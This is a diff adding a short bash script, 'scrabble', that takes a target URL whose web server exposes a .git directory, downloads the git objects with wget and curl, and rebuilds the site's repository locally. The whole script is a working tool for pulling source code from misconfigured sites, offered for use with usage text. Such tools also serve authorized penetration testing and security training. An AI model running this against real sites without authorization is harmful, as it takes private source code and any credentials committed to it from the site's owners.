@@ -1,0 +1,66 @@
+#!/bin/bash
+#
+# Author: Denny Huang <denny0223@gmail.com>
+# Wed Sep 17 2014
+# MIT License
+
+function downloadBlob {
+	echo downloadBlob $1
+
+	mkdir -p ${1:0:2}
+	cd $_
+
+	wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
+
+	cd ..
+}
+
+function parseTree {
+	echo parseTree $1
+
+	downloadBlob $1
+
+	while read line
+	do
+		type=$(echo $line | awk '{print $2}')
+		hash=$(echo $line | awk '{print $3}')
+
+		[ "$type" = "tree" ] && parseTree $hash || downloadBlob $hash
+	done < <(git cat-file -p $1)
+}
+
+function parseCommit {
+	echo parseCommit $1
+
+	downloadBlob $1
+
+	tree=$(git cat-file -p $1| sed -n '1p' | awk '{print $2}')
+	parseTree $tree
+
+	parent=$(git cat-file -p $1 | sed -n '2p' | awk '{print $2}')
+
+	[ ${#parent} -eq 40 ] && parseCommit $parent
+}
+
+[ -z $1 ] && echo -e "missing target url\n\n\
+Usage: scrabble <url>\n\
+Example: scrabble http://example.com/\n\n\
+You need make sure target url had .git folder"\
+&& exit
+
+domain=$1
+ref=$(curl -s $domain/.git/HEAD | awk '{print $2}')
+
+lastHash=$(curl -s $domain/.git/$ref)
+
+git init
+
+cd .git/objects/
+
+parseCommit $lastHash
+
+cd ../../
+
+echo $lastHash > .git/refs/heads/master
+
+git reset --hard
